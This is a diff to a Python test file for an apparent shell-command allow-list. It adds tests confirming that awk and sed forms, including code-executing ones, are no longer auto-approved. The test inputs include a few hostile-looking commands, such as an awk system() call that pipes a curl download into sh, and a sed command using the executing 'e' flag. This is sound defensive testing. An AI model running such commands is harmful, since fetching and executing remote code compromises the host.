@@ -225,8 +225,44 @@ def test_find_with_exec_denied() -> None:
     assert is_safe_shell_command("find . -name '*.py'") is True
 
 
-def test_sed_in_place_denied_at_shell_level() -> None:
+# ── cpp#27: awk + sed dropped from SAFE_SHELL_COMMANDS ───────────────────────
+#
+# Both interpreters have arbitrary-code-execution sub-features (awk system()/
+# print|cmd/getline|cmd/BEGIN, GNU sed `e` command/flag). Exhaustive
+# sub-feature guards are infeasible; option (a) removes them from the
+# allow-list entirely. All awk/sed forms route to policy/relay.
+
+
+def test_tier1_rejects_awk_system_exec() -> None:
+    """cpp#27 AC1: awk system() forms must NOT auto-approve."""
+    assert is_safe_shell_command("awk 'BEGIN{system(\"id\")}'") is False
+    assert is_safe_shell_command("awk 'BEGIN{system(\"curl x|sh\")}'") is False
+
+
+def test_tier1_rejects_awk_safe_forms() -> None:
+    """cpp#27 AC3: safe-shape awk also routes to relay (cost of option (a))."""
+    assert is_safe_shell_command("awk '{print $1}' file") is False
+
+
+def test_tier1_rejects_all_sed_forms() -> None:
+    """cpp#27 AC2: ALL sed forms denied at shell allow-list (no longer
+    in SAFE_SHELL_COMMANDS); routes to relay regardless of flags."""
+    # Dangerous GNU `e` command/flag (executes pattern space):
+    assert is_safe_shell_command("sed 's/x/y/e' file") is False
+    # Standard `-e` option:
+    assert is_safe_shell_command("sed -e 's/a/b/' file") is False
+    # Plain safe form (also routes to relay per option (a)):
+    assert is_safe_shell_command("sed 's/a/b/' file") is False
+    # `-i` still denied (also by TIER3_PATTERNS, defense-in-depth):
     assert is_safe_shell_command("sed -i s/a/b/ file") is False
+
+
+def test_tier1_still_approves_other_read_only_shell_tools() -> None:
+    """cpp#27 AC4 regression: other allow-list entries continue to approve."""
+    assert is_safe_shell_command("grep -r foo .") is True
+    assert is_safe_shell_command("cat /tmp/file") is True
+    assert is_safe_shell_command("find . -name '*.py'") is True
+    assert is_safe_shell_command("ls -la /tmp") is True
 
 
 # ── gh api ───────────────────────────────────────────────────────────────────
